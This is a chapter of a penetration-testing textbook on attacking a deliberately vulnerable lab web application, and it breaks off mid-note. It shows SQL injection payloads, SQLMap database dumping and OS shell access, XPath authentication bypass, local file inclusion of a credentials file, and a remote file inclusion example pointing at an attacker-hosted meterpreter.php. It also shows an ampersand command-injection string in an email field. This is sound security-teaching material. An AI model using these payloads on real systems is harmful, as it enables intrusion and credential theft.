<html><head></head><body><section class="chapter" epub:type="chapter" id="web_application_testing" title="Chapter&#xA0;14.&#xA0;Web Application Testing"><div class="titlepage"><div><div><h2 class="title">Chapter 14. Web Application Testing</h2></div></div></div><p><a class="indexterm" id="iddle1115"/><a class="indexterm" id="iddle2428"/>Though automated scanners are great at finding known vulnerabilities in web applications, many clients build custom web applications. Sure, commercial products can automate attacks against user input fields in custom web applications, but nothing can replace a good penetration tester with a proxy when it comes to finding security issues in these applications.</p><p>Like all software, web applications may have issues when input is not properly sanitized. For example, when an application pulls data from a database based on certain user input, the application may expect specific input such as a username and password. If, instead, the user enters special input to create additional database queries, he or she may be able to steal data from the database, bypass authentication, or even execute commands on the underlying system.</p><p><a class="indexterm" id="iddle1148"/><a class="indexterm" id="iddle1149"/><a class="indexterm" id="iddle1150"/><a class="indexterm" id="iddle1594"/><a class="indexterm" id="iddle2429"/>In this chapter we’ll look at finding some common vulnerabilities in web applications using the example web application installed on the Windows 7 target: a simple bookstore with several security issues frequently found in web applications. (See <a class="xref" href="ch01.xhtml#installing_additional_software" title="Installing Additional Software">Installing Additional Software</a> for installation instructions.)</p><div class="sect1" title="Using Burp Proxy"><div class="titlepage"><div><div><h2 class="title" id="using_burp_proxy" style="clear: both">Using Burp Proxy</h2></div></div></div><p>We can use a proxy to capture requests and responses between our browser and the web application so we can see exactly what data is being transmitted. Kali Linux comes with the free version of Burp Suite, a testing platform for web applications that includes a proxy feature. Burp includes other useful components, such as Burp Spider, which can crawl through web application content and functionality, and Burp Repeater, which allows you to manipulate and resend requests to the server. For now, we’ll focus on the Burp Proxy tab.</p><p>To start Burp Suite in Kali Linux, go to Applications at the top left of the Kali GUI, and then click <span class="strong"><strong>Kali Linux</strong></span> ▸ <span class="strong"><strong>Web Applications</strong></span> ▸ <span class="strong"><strong>Web Application Fuzzers</strong></span> ▸ <span class="strong"><strong>burpsuite</strong></span>, as shown in <a class="xref" href="ch14.xhtml#starting_burp_suite_in_kali" title="Figure 14-1. Starting Burp Suite in Kali">Figure 14-1</a>.</p><div class="figure"><a id="starting_burp_suite_in_kali"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00118"/><img alt="Starting Burp Suite in Kali" src="httpatomoreillycomsourcenostarchimages2030426.png.jpg"/></div></div><div class="figure-title">Figure 14-1. Starting Burp Suite in Kali</div></div><p>Click the Proxy tab, as shown in <a class="xref" href="ch14.xhtml#burp_proxy_interface" title="Figure 14-2. Burp Proxy interface">Figure 14-2</a>. By default, the Intercept is on button should be selected so that Burp Suite intercepts and traps any outgoing requests from a web browser configured to use Burp as a proxy for web traffic. This setting will allow us to see and even modify the details of web requests before they are sent to the server.</p><div class="figure"><a id="burp_proxy_interface"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00119"/><img alt="Burp Proxy interface" src="httpatomoreillycomsourcenostarchimages2030428.png.jpg"/></div></div><div class="figure-title">Figure 14-2. Burp Proxy interface</div></div><p><a class="indexterm" id="iddle1492"/>Now we need to tell our browser in Kali Linux to proxy web traffic through Burp Suite.</p><div class="orderedlist"><ol class="orderedlist" type="1"><li class="listitem"><p>Open the Iceweasel browser, go to <span class="strong"><strong>Edit</strong></span> ▸ <span class="strong"><strong>Preferences</strong></span> ▸ <span class="strong"><strong>Advanced</strong></span>, and select the <span class="strong"><strong>Network</strong></span> tab.</p></li><li class="listitem"><p>Click <span class="strong"><strong>Settings</strong></span> to the right of Connection.</p></li><li class="listitem"><p>In the Connection Settings dialog, shown in <a class="xref" href="ch14.xhtml#setting_a_proxy_in_iceweasel" title="Figure 14-3. Setting a proxy in Iceweasel">Figure 14-3</a>, select <span class="strong"><strong>Manual proxy configuration</strong></span>, and enter the IP address <span class="strong"><strong><code class="literal">127.0.0.1</code></strong></span> and port <span class="strong"><strong><code class="literal">8080</code></strong></span>. This tells Iceweasel to proxy traffic through the localhost on port 8080, the default port for Burp Proxy.</p></li></ol></div><div class="figure"><a id="setting_a_proxy_in_iceweasel"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00120"/><img alt="Setting a proxy in Iceweasel" src="httpatomoreillycomsourcenostarchimages2030430.png.jpg"/></div></div><div class="figure-title">Figure 14-3. Setting a proxy in Iceweasel</div></div><p><a class="indexterm" id="iddle1482"/>To ensure that Iceweasel will proxy all our traffic through Burp Suite, browse to the URL bookservice on your Windows 7 target: <span class="emphasis"><em><a class="ulink" href="http://192.168.20.12/bookservice" target="_top">http://192.168.20.12/bookservice</a></em></span>.</p><p>The connection should appear to hang in the browser, and the browser and Burp Suite should light up as the <code class="literal">HTTP GET</code> request for the main page of the bookservice site is captured by Burp Proxy, as shown in <a class="xref" href="ch14.xhtml#captured_http_get_request" title="Figure 14-4. Captured HTTP GET request">Figure 14-4</a>.</p><div class="figure"><a id="captured_http_get_request"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00121"/><img alt="Captured HTTP GET request" src="httpatomoreillycomsourcenostarchimages2030432.png.jpg"/></div></div><div class="figure-title">Figure 14-4. Captured <code class="literal">HTTP GET</code> request</div></div><p>We can see the details of the <code class="literal">HTTP GET</code> request asking the server for the bookservice web page.</p><p>As we will see later, we can make changes to the request before sending it on to the server, but for now, let’s just go ahead and forward the request (and any subsequent ones) by clicking the <span class="strong"><strong>Forward</strong></span> button. Returning to the browser, we see the server has sent us the main page of the bookservice site, as shown in <a class="xref" href="ch14.xhtml#bookservice_site" title="Figure 14-5. Bookservice site">Figure 14-5</a>.</p><div class="figure"><a id="bookservice_site"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00122"/><img alt="Bookservice site" src="httpatomoreillycomsourcenostarchimages2030434.png.jpg"/></div></div><div class="figure-title">Figure 14-5. Bookservice site</div></div><p><a class="indexterm" id="iddle2436"/>Next let’s try signing up for an account (<a class="xref" href="ch14.xhtml#signing_up_for_a_new_account" title="Figure 14-6. Signing up for a new account">Figure 14-6</a>). Click <span class="strong"><strong>Login</strong></span> at the top left of the page, and then forward the request to the server from the proxy. Do the same to get to the Sign Up page by clicking <span class="strong"><strong>New User</strong></span> and forwarding the request to the server.</p><div class="figure"><a id="signing_up_for_a_new_account"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00123"/><img alt="Signing up for a new account" src="httpatomoreillycomsourcenostarchimages2030436.png.jpg"/></div></div><div class="figure-title">Figure 14-6. Signing up for a new account</div></div><p>Enter a username, password, and email address, then submit the request by clicking <span class="strong"><strong>Go</strong></span>. The request should be captured in Burp Proxy, as shown in <a class="xref" href="ch14.xhtml#captured_request" title="Figure 14-7. Captured request">Figure 14-7</a>.</p><div class="figure"><a id="captured_request"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00124"/><img alt="Captured request" src="httpatomoreillycomsourcenostarchimages2030438.png.jpg"/></div></div><div class="figure-title">Figure 14-7. Captured request</div></div><p>In addition to looking at the raw request, which is a bit unfriendly to read, you can click the Params tab at the top of the request window in Burp Suite to display the request parameters in a more readable format, as shown in <a class="xref" href="ch14.xhtml#request_parameters" title="Figure 14-8. Request parameters">Figure 14-8</a>.</p><div class="figure"><a id="request_parameters"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00125"/><img alt="Request parameters" src="httpatomoreillycomsourcenostarchimages2030440.png.jpg"/></div></div><div class="figure-title">Figure 14-8. Request parameters</div></div><p><a class="indexterm" id="iddle1642"/><a class="indexterm" id="iddle2212"/><a class="indexterm" id="iddle2437"/>For example, the new display shows the User field <span class="emphasis"><em>georgia</em></span>, Pass field <span class="emphasis"><em>password</em></span>, and Email field <span class="emphasis"><em>georgia@bulbsecurity.com</em></span>.</p><p>You can change these fields directly in the proxy. For example, if you change <span class="emphasis"><em>georgia</em></span>’s password to <span class="emphasis"><em>password1</em></span> before forwarding the request to the server, the server will set the password for user <span class="emphasis"><em>georgia</em></span> to <span class="emphasis"><em>password1</em></span>, because the server never saw the original request from the browser requesting the password <span class="emphasis"><em>password</em></span>.</p><p>The proxy allows you to see the details of any request to the server. If at any point you don’t need to proxy traffic, click <span class="strong"><strong>Intercept is on</strong></span> to toggle it to <span class="strong"><strong>Intercept is off</strong></span> and allow traffic to pass through to the server without user interaction. Switch the button back on if you want to catch a particular request.</p></div><div class="sect1" title="SQL Injection"><div class="titlepage"><div><div><h2 class="title" id="sql_injection" style="clear: both">SQL Injection</h2></div></div></div><p>Many web applications store data in a backend, SQL-based database. For example, we encountered a SQL database during our network penetration test, when we found an open MySQL database through phpMyAdmin in the XAMPP install on the Windows XP target in <a class="xref" href="ch08.xhtml#exploiting_open_phpmyadmin" title="Exploiting Open phpMyAdmin">Exploiting Open phpMyAdmin</a>. We then used a SQL query to write a simple PHP command shell to the web server.</p><p>We typically won’t have direct access to run SQL queries on a site’s backend database from a web application. However, if a developer fails to sanitize user input when interacting with the database, you may find that you can perform a <span class="emphasis"><em>SQL injection attack</em></span> to manipulate the queries sent to it. Successful SQL injection attacks can read data from the database, modify data, shut down or destroy the database, and, in some cases, even run commands on the underlying operating system (which can be especially powerful because database servers often run as privileged users).</p><p>A natural place to look for SQL injection issues is in the login page. Many web applications store user data in a database, so we can use a SQL query to pull out the correct user, based on the username and password provided by the user. When developers don’t sanitize user input, we can build SQL queries to attack the database. An example of an injectable SQL statement that could be leveraged by an attacker is shown here:</p><a id="pro_id00178"/><pre class="programlisting">SELECT id FROM users WHERE  username='$username' AND password='$password';</pre><p>What if an attacker supplied a username <span class="emphasis"><em>’ OR ’1’=’1</em></span> and the user’s password was <span class="emphasis"><em>’ OR ’1’=’1</em></span>? The SQL statement turns into:</p><a id="pro_id00179"/><pre class="programlisting">SELECT username FROM users WHERE username='' or '1'='1' AND password='' or '1'='1'</pre><p>Because the <span class="emphasis"><em>OR ’1’=’1’</em></span> will always be true, this <code class="literal">SELECT</code> statement will now return the first username in the user table, regardless of the username and password.</p><p><a class="indexterm" id="iddle2540"/>As we’ll see in <a class="xref" href="ch14.xhtml#xpath_injection" title="XPath Injection">XPath Injection</a>, our application uses Xpath, a query language for XML documents, which authenticates against an XML file rather than a database, though the injection process is similar. However, our application does use a SQL database to store records of the books available in the store, and when we select a book on the main page, its details are pulled from an MS SQL backend database. For example, click the <span class="strong"><strong>More Details</strong></span> link for the first book on the site, <span class="emphasis"><em>Don’t Make Me Think</em></span>. The URL requested is:</p><a id="pro_id00180"/><pre class="programlisting">http://192.168.20.12/bookservice/bookdetail.aspx?<span class="strong"><strong>id=1</strong></span></pre><p>The book’s details are filled in based on the results returned from the database query for the record with ID <code class="literal">1</code>.</p><div class="sect2" title="Testing for SQL Injection Vulnerabilities"><div class="titlepage"><div><div><h3 class="title" id="testing_for_sql_injection_vulnerabilitie">Testing for SQL Injection Vulnerabilities</h3></div></div></div><p>A typical first test for SQL injection vulnerabilities is to use a single quotation mark to close the SQL query. If a SQL injection vulnerability is present, the addition of that quotation mark should cause the application to throw a SQL error, because the query will already be closed as part of the underlying code and the extra single quote will cause the SQL syntax to be incorrect. That error will tell us that we can inject SQL queries to the site’s database using the <code class="literal">id</code> parameter.</p><p>Let’s try this out by sending the query again with the <code class="literal">id</code> parameter to <span class="emphasis"><em>1’</em></span>, as shown here.</p><a id="pro_id00181"/><pre class="programlisting">http://192.168.20.12/bookservice/bookdetail.aspx?id=1'</pre><p>As expected, the application serves an error page indicating that our SQL syntax is incorrect, as shown in <a class="xref" href="ch14.xhtml#application_identifies_a_sql_errordot" title="Figure 14-9. The application identifies a SQL error.">Figure 14-9</a>.</p><div class="figure"><a id="application_identifies_a_sql_errordot"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00126"/><img alt="The application identifies a SQL error." src="httpatomoreillycomsourcenostarchimages2030442.png.jpg"/></div></div><div class="figure-title">Figure 14-9. The application identifies a SQL error.</div></div><p>In particular, note the message “Unclosed quotation mark after the character string” in our SQL query.</p><div class="note" title="Note"><h3 class="title"><a id="ch14note01"/>Note</h3><p><a class="indexterm" id="iddle1249"/><a class="indexterm" id="iddle2213"/>Not all applications that are vulnerable to SQL injection will be so verbose with their error messages. In fact, there is a whole class of blind SQL injection vulnerabilities, where error messages detailing the injection are not shown, even though the injection flaw is still present.</p></div></div><div class="sect2" title="Exploiting SQL Injection Vulnerabilities"><div class="titlepage"><div><div><h3 class="title" id="exploiting_sql_injection_vulnerabilities">Exploiting SQL Injection Vulnerabilities</h3></div></div></div><p>Now that we know a SQL injection vulnerability is present in this site, we can exploit it to run additional queries on the database that the developer never intended. For example, we can find out the name of the first database with the following query:</p><a id="pro_id00182"/><pre class="programlisting">http://192.168.20.12/bookservice/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--</pre><p>The query throws an error message, <span class="emphasis"><em>Conversion failed when converting the nvarchar value ‘BookApp’ to data type int</em></span>, which tells us that the name of the first database is BookApp, as shown in <a class="xref" href="ch14.xhtml#error_message_showing_the_database_name" title="Figure 14-10. Error message showing the database name">Figure 14-10</a>.</p><div class="figure"><a id="error_message_showing_the_database_name"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00127"/><img alt="Error message showing the database name" src="httpatomoreillycomsourcenostarchimages2030444.png.jpg"/></div></div><div class="figure-title">Figure 14-10. Error message showing the database name</div></div></div><div class="sect2" title="Using SQLMap"><div class="titlepage"><div><div><h3 class="title" id="using_sqlmap">Using SQLMap</h3></div></div></div><p>We can also use tools to automatically generate SQL queries to perform various tasks on a site using SQL injection. All we need is an injection point; the tool does the rest. For example, <a class="xref" href="ch14.xhtml#dumping_the_database_with_sqlmap" title="Example 14-1. Dumping the database with SQLMap">Example 14-1</a> shows how when we give a tool in Kali SQLMap a potentially injectable URL, SQLMap tests for SQL injection vulnerabilities and performs injection queries.</p><div class="example"><a id="dumping_the_database_with_sqlmap"/><div class="example-title">Example 14-1. Dumping the database with SQLMap</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>sqlmap -u</strong></span>❶ <span class="strong"><strong>"http://192.168.20.12/bookservice/bookdetail.aspx?id=2" --dump</strong></span>❷&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
[21:18:10] [INFO] GET parameter 'id' is 'Microsoft SQL Server/Sybase stacked queries' injectable&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
Database: BookApp&#13;
Table: dbo.BOOKMASTER&#13;
[9 entries]&#13;
+--------+---------------+-------+-------+-------------------------------------&#13;
| BOOKID | ISBN          | PRICE | PAGES | PUBNAME | BOOKNAME                                                                                             | FILENAME | AUTHNAME | DESCRIPTION&#13;
&#13;
                                     |&#13;
+--------+---------------+-------+-------+-------------------------------------&#13;
| 1      | 9780470412343 | 11.33 | 140   | Que; 1st edition (October 23, 2000) | Do not Make&#13;
Me Think A Common Sense Approach to Web Usability                                        |&#13;
4189W8B2NXL.jpg | Steve Krug and Roger Black | All of the tips, techniques, and examples&#13;
presented revolve around users being able to surf merrily through a well-designed site&#13;
with minimal cognitive strain. Readers will quickly come to agree with many of the books&#13;
assumptions, such as We do not read pages--we scan them and We do not figure out how things&#13;
work--we muddle through. Coming to grips with such hard facts sets the stage for Web design&#13;
that then produces topnotch sites. |&#13;
--<span class="emphasis"><em>snip</em></span>--                      |</pre></div></div><p><a class="indexterm" id="iddle1247"/><a class="indexterm" id="iddle2543"/>Specify the URL to test with <code class="literal">-u</code> option ❶. The <code class="literal">--dump</code> option ❷ dumps the contents of the database—in this case, details of the books.</p><p>We can also use SQLMap to try to get command-shell access on the underlying system. MS SQL databases contain a stored procedure called <code class="literal">xp_cmdshell</code>, which will give us command-shell access, but it’s often disabled. Luckily, SQLMap will try to reenable it. <a class="xref" href="ch14.xhtml#xpunderscorecmdshell_access_through_sql" title="Example 14-2. xp_cmdshell access through SQL injection">Example 14-2</a> shows how we can get a command shell on the site’s underlying Windows 7 target system using SQLMap.</p><div class="example"><a id="xpunderscorecmdshell_access_through_sql"/><div class="example-title">Example 14-2. <code class="literal">xp_cmdshell</code> access through SQL injection</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>sqlmap -u "http://192.168.20.12/bookservice/bookdetail.aspx?id=2" --os-shell</strong></span>&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
xp_cmdshell extended procedure does not seem to be available. Do you want sqlmap to try to re-enable it? [Y/n] <span class="strong"><strong>Y</strong></span>&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
os-shell&gt; <span class="strong"><strong>whoami</strong></span>&#13;
do you want to retrieve the command standard output? [Y/n/a] <span class="strong"><strong>Y</strong></span>&#13;
command standard output:    'nt authority\system'</pre></div></div><p>As you can see in <a class="xref" href="ch14.xhtml#xpunderscorecmdshell_access_through_sql" title="Example 14-2. xp_cmdshell access through SQL injection">Example 14-2</a>, we receive a shell running as <span class="emphasis"><em>System</em></span> without having to guess credentials for the database.</p><div class="note" title="Note"><h3 class="title"><a id="ch14note02"/>Note</h3><p>The MS SQL database is not listening on a port anyway, so we can’t access it directly. Unlike our Windows XP system in <a class="xref" href="ch06.xhtml" title="Chapter 6. Finding Vulnerabilities">Chapter 6</a>, this web server lacks phpMyAdmin, so we have no other way to access the database. A SQL injection issue in the hosted website gives us full system access.</p></div></div></div><div class="sect1" title="XPath Injection"><div class="titlepage"><div><div><h2 class="title" id="xpath_injection" style="clear: both">XPath Injection</h2></div></div></div><p><a class="indexterm" id="iddle2438"/><a class="indexterm" id="iddle2538"/><a class="indexterm" id="iddle2541"/>As mentioned previously, this bookservice application uses XML authentication, in which the XML is queried using Xpath. We can use <span class="emphasis"><em>XPath injection</em></span> to attack XML. Though its syntax differs from SQL, the injection process is similar.</p><p>For example, try entering single quotes (<span class="strong"><strong><code class="literal">'</code></strong></span>) for both the username and password fields at the login page. You should receive an error like the one shown in <a class="xref" href="ch14.xhtml#xml_error_at_login" title="Figure 14-11. XML error at login">Figure 14-11</a>.</p><div class="figure"><a id="xml_error_at_login"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00128"/><img alt="XML error at login" src="httpatomoreillycomsourcenostarchimages2030446.png.jpg"/></div></div><div class="figure-title">Figure 14-11. XML error at login</div></div><p>As you can see from the error message shown in <a class="xref" href="ch14.xhtml#xml_error_at_login" title="Figure 14-11. XML error at login">Figure 14-11</a>, we again have an injection issue because we have an error in our syntax. Because we are at a login page, a typical injection strategy for Xpath would be to attempt to bypass authentication and gain access to the authenticated portion of the application by attacking the Xpath query logic.</p><p>For example, as shown in the error details, the login query grabs the username and password provided, and then compares the values provided against credentials in an XML file. Can we create a query to bypass the need for valid credentials? Enter a set of dummy credentials at login, and capture the request with Burp Proxy, as shown in <a class="xref" href="ch14.xhtml#captured_login_request" title="Figure 14-12. Captured login request">Figure 14-12</a>.</p><p>Now change the <code class="literal">txtUser</code> and <code class="literal">txtPass</code> parameters in the captured request to this value.</p><a id="pro_id00183"/><pre class="programlisting">' or '1'='1</pre><div class="figure"><a id="captured_login_request"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00129"/><img alt="Captured login request" src="httpatomoreillycomsourcenostarchimages2030448.png.jpg"/></div></div><div class="figure-title">Figure 14-12. Captured login request</div></div><p><a class="indexterm" id="iddle1635"/><a class="indexterm" id="iddle2433"/>This tells the login Xpath query to find the user account where the username and password field is blank or <span class="emphasis"><em>1=1</em></span>. Because <span class="emphasis"><em>1=1</em></span> always evaluates as true, the logic of this query says to return the user where the username is blank or present—likewise with the password. Thus using this injection method, we can get the application to log us in as the first user in the authentication file. And, as shown in <a class="xref" href="ch14.xhtml#authentication_bypass_through_xpath_inje" title="Figure 14-13. Authentication bypass through Xpath injection">Figure 14-13</a>, we are logged in as the user <span class="emphasis"><em>Mike</em></span>.</p><div class="figure"><a id="authentication_bypass_through_xpath_inje"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00130"/><img alt="Authentication bypass through Xpath injection" src="httpatomoreillycomsourcenostarchimages2030450.png.jpg"/></div></div><div class="figure-title">Figure 14-13. Authentication bypass through Xpath injection</div></div></div><div class="sect1" title="Local File Inclusion"><div class="titlepage"><div><div><h2 class="title" id="local_file_inclusion" style="clear: both">Local File Inclusion</h2></div></div></div><p>Another vulnerability commonly found in web applications is <span class="emphasis"><em>local file inclusion</em></span>, which is the ability to read files from the application or the rest of the filesystem that we should not have access to through the web app. We saw an example of this in <a class="xref" href="ch08.xhtml" title="Chapter 8. Exploitation">Chapter 8</a> where the Zervit web server on the Windows XP target allowed us to download files from the target, such as a backup of the SAM and SYSTEM hives.</p><p>Our bookservice app also suffers from local file inclusion. As user <span class="emphasis"><em>Mike</em></span>, go to <span class="strong"><strong>Profile</strong></span> ▸ <span class="strong"><strong>View Newsletters</strong></span>. Click the first newsletter in the list to view the contents of the file, as shown in <a class="xref" href="ch14.xhtml#viewing_a_newsletter" title="Figure 14-14. Viewing a newsletter">Figure 14-14</a>.</p><div class="figure"><a id="viewing_a_newsletter"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00131"/><img alt="Viewing a newsletter" src="httpatomoreillycomsourcenostarchimages2030452.png.jpg"/></div></div><div class="figure-title">Figure 14-14. Viewing a newsletter</div></div><p>Now resend the request, and capture it with Burp Proxy, as shown in <a class="xref" href="ch14.xhtml#captured_newsletter_request" title="Figure 14-15. Captured newsletter request">Figure 14-15</a>.</p><div class="figure"><a id="captured_newsletter_request"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00132"/><img alt="Captured newsletter request" src="httpatomoreillycomsourcenostarchimages2030454.png.jpg"/></div></div><div class="figure-title">Figure 14-15. Captured newsletter request</div></div><p>Click the <span class="strong"><strong>Params</strong></span> tab, and note the parameter <span class="emphasis"><em>c:\inetpub\wwwroot\Book\NewsLetter\Mike@Mike.com\Web Hacking Review.txt</em></span>. The path <span class="emphasis"><em>c:\inetpub\wwwroot\Book\NewsLetter\Mike</em></span> suggests that the newsletter functionality is pulling the newsletters from the local filesystem by their absolute path. It also looks like there’s a folder called <span class="emphasis"><em>Mike@Mike.com</em></span> in the <span class="emphasis"><em>Newsletter</em></span> folder. Perhaps each user subscribed to the newsletters has such as folder.</p><p>It also seems as if our application is actually at the path <span class="emphasis"><em>c:\inetpub\wwwroot\Book</em></span>, as noted in the newsletter requests, instead of <span class="emphasis"><em>c:\inetpub\wwwroot\bookservice</em></span> as we might expect from the URL. We note this because it may come in handy later on.</p><p><a class="indexterm" id="iddle2439"/><a class="indexterm" id="iddle2539"/>What if we change the filename parameter to another file in the web application? Can we gain access to the app’s full source code? For example, change the file to the following, and forward the request to the server.</p><a id="pro_id00184"/><pre class="programlisting">C:\inetpub\wwwroot\Book\Search.aspx</pre><p>As you can see, the source code of the <span class="emphasis"><em>Search.aspx</em></span> page is displayed in the Newsletter box, as shown in <a class="xref" href="ch14.xhtml#local_file_inclusion_vulnerability" title="Figure 14-16. Local file inclusion vulnerability">Figure 14-16</a>.</p><p>Having access to the full server-side source code of the web application allows us to do a complete source code review to look for issues.</p><p>But perhaps we can access even more sensitive data. For example, we know that the usernames and passwords are stored in an XML file. Perhaps we can request this file. We don’t know its name, but a few guesses for common filenames in XML authentication scenarios will lead us to the filename <span class="emphasis"><em>AuthInfo.xml</em></span>. Capture the newsletter request in Burp Proxy, and change the requested file to the one shown here.</p><div class="figure"><a id="local_file_inclusion_vulnerability"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00133"/><img alt="Local file inclusion vulnerability" src="httpatomoreillycomsourcenostarchimages2030456.png"/></div></div><div class="figure-title">Figure 14-16. Local file inclusion vulnerability</div></div><a id="pro_id00185"/><pre class="programlisting">C:\inetpub\wwwroot\Book\AuthInfo.xml</pre><p>As you can see in <a class="xref" href="ch14.xhtml#authentication_info" title="Figure 14-17. Authentication info">Figure 14-17</a>, we now have access to the usernames and passwords in plaintext. Now we know why our previous Xpath injection logged us in as the user <span class="emphasis"><em>Mike</em></span>: <span class="emphasis"><em>Mike</em></span> is the first user in the file.</p><p>This is a prime example of when using a proxy comes in handy. A user with just a browser would have been limited to only the files he or she could click on, namely the newsletters presented. On the other hand, with the proxy we are able to see the request ask for a specific file from the <a class="indexterm" id="iddle1193"/><a class="indexterm" id="iddle2057"/><a class="indexterm" id="iddle2430"/><a class="indexterm" id="iddle2434"/>filesystem. By changing the filename manually in the request using Burp Proxy, we were able to see other sensitive files. No doubt the developer did not consider the possibility that the user could just ask for any file and, thus, did not think to limit the files that could be accessed through the user’s newsletters.</p><div class="figure"><a id="authentication_info"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00134"/><img alt="Authentication info" src="httpatomoreillycomsourcenostarchimages2030458.png"/></div></div><div class="figure-title">Figure 14-17. Authentication info</div></div><p>Worse still, we aren’t limited to files from the web application. We can load any file from the filesystem that the IIS_USER has read access to. For example, if you create a file called <span class="emphasis"><em>secret.txt</em></span> on the C: drive, you can load it through the newsletters functionality. Just substitute the file you want in the request in Burp Suite. If we can find a way to upload files to a web application, we can even use LFI vulnerability to execute malicious code on the webserver.</p></div><div class="sect1" title="Remote File Inclusion"><div class="titlepage"><div><div><h2 class="title" id="remote_file_inclusion" style="clear: both">Remote File Inclusion</h2></div></div></div><p>Remote file inclusion (RFI) vulnerabilities allow attackers to load and execute malicious scripts, hosted elsewhere, on a vulnerable server. In <a class="xref" href="ch08.xhtml" title="Chapter 8. Exploitation">Chapter 8</a>, we used the open phpMyAdmin interface in XAMPP to write a simple PHP shell and finally a PHP version of Meterpreter to the web server. Though we are not uploading a file to the server here, the attack is similar. If we can trick the vulnerable server into executing a remote script, we can run commands on the underlying system.</p><p>Our site does not have a remote file inclusion vulnerability, but simple vulnerable PHP code is shown here as an illustration.</p><a id="pro_id00186"/><pre class="programlisting">&lt;?php&#13;
include($_GET['file']);&#13;
?&gt;</pre><p>An attacker can host a malicious PHP script (such as the <span class="emphasis"><em>meterpreter.php</em></span> script we used in <a class="xref" href="ch08.xhtml" title="Chapter 8. Exploitation">Chapter 8</a>) on their webserver and request the page with the file parameter set to <span class="emphasis"><em>http://&lt;attacker_ip&gt;/meterpreter.php</em></span>. The RFI vulnerability would cause <span class="emphasis"><em>meterpreter.php</em></span> to be executed by the webserver even though it is hosted elsewhere. Of course, our example application is ASP.net not PHP, but Msfvenom can create payloads in ASPX format for these sorts of apps.</p></div><div class="sect1" title="Command Execution"><div class="titlepage"><div><div><h2 class="title" id="command_execution" style="clear: both">Command Execution</h2></div></div></div><p>As noted earlier, the <span class="emphasis"><em>Newsletters</em></span> folder contains a folder called <span class="emphasis"><em>Mike@Mike.com</em></span>. Logically, this suggests that the site may contain similar folders with the email addresses of all users signed up to receive newsletters. Some part of the application must be creating these folders as users register or sign up for the newsletter. The application’s code is probably running a command to create the folders on the filesystem. Perhaps, again through lack of input validation, we can run additional commands that the developer never intended us to run.</p><p><a class="indexterm" id="iddle1006"/><a class="indexterm" id="iddle1036"/><a class="indexterm" id="iddle1131"/><a class="indexterm" id="iddle1563"/><a class="indexterm" id="iddle2442"/>As shown in <a class="xref" href="ch14.xhtml#newsletter_signup" title="Figure 14-18. Newsletter Signup">Figure 14-18</a>, the bottom right of the web app contains a form to sign up for newsletters. We suspect that when we enter an email address, a folder is created for that email address in the <span class="emphasis"><em>newsletters</em></span> folder.</p><p>We guess that the email address input is fed to a system command to create a directory in the <span class="emphasis"><em>newsletters</em></span> folder. If the developer does not properly sanitize user input, we may be able to run additional commands using the ampersand (<code class="literal">&amp;</code>) symbol.</p><div class="figure"><a id="newsletter_signup"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00135"/><img alt="Newsletter Signup" src="httpatomoreillycomsourcenostarchimages2030460.png.jpg"/></div></div><div class="figure-title">Figure 14-18. Newsletter Signup</div></div><p>We’ll execute a command and send its output to a file in our application’s <span class="emphasis"><em>C:\inetpub\wwwroot\Book\</em></span> directory, then access the files directly to see the command’s output. Run the <code class="literal">ipconfig</code> command on the Windows 7 target as shown here to pipe the output from a system command such as <code class="literal">ipconfig</code> to the file <span class="emphasis"><em>test.txt</em></span> in the <span class="emphasis"><em>Book</em></span> directory.</p><a id="pro_id00187"/><pre class="programlisting">georgia@bulbsecurity.com &amp; ipconfig &gt; C:\inetpub\wwwroot\Book\test.txt</pre><p>When we browse to <span class="emphasis"><em><a class="ulink" href="http://192.168.20.12/bookservice/test.txt" target="_top">http://192.168.20.12/bookservice/test.txt</a></em></span>, we see the output of our <code class="literal">ipconfig</code> command, as shown in <a class="xref" href="ch14.xhtml#command_execution_output" title="Figure 14-19. Command execution output">Figure 14-19</a>.</p><div class="figure"><a id="command_execution_output"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00136"/><img alt="Command execution output" src="httpatomoreillycomsourcenostarchimages2030462.png.jpg"/></div></div><div class="figure-title">Figure 14-19. Command execution output</div></div><p><a class="indexterm" id="iddle1230"/><a class="indexterm" id="iddle1500"/><a class="indexterm" id="iddle1553"/><a class="indexterm" id="iddle1984"/><a class="indexterm" id="iddle2048"/><a class="indexterm" id="iddle2252"/><a class="indexterm" id="iddle2432"/><a class="indexterm" id="iddle2479"/><a class="indexterm" id="iddle2545"/>We will be limited to the privileges of the Internet Information Services (IIS) user. Unfortunately for us, the Microsoft IIS application on Windows 7 systems runs as a separate account without the full privileges of a system user: a better security scenario for the developer but a more challenging one for us.</p><p>Though we don’t have full access, we will be able to gather a lot of information about the system with the access we do have. For example, we can use the <code class="literal">dir</code> command to find interesting files, or the command <code class="literal">netsh advfirewall firewall show rule name=all</code> to see the rules in the Windows firewall.</p><p>Since we are on a Windows system we cannot use <code class="literal">wget</code> from the command line to pull down an interactive shell, but we can use various other methods to do so. In <a class="xref" href="ch08.xhtml" title="Chapter 8. Exploitation">Chapter 8</a> we used TFTP to transfer a shell from our Kali system to the Windows XP target. Windows 7 does not have a TFTP client installed by default, but in Windows 7 we do have a powerful scripting language called <span class="emphasis"><em>Powershell</em></span>, which we can use for tasks such as downloading and executing a file.</p><div class="note" title="Note"><h3 class="title"><a 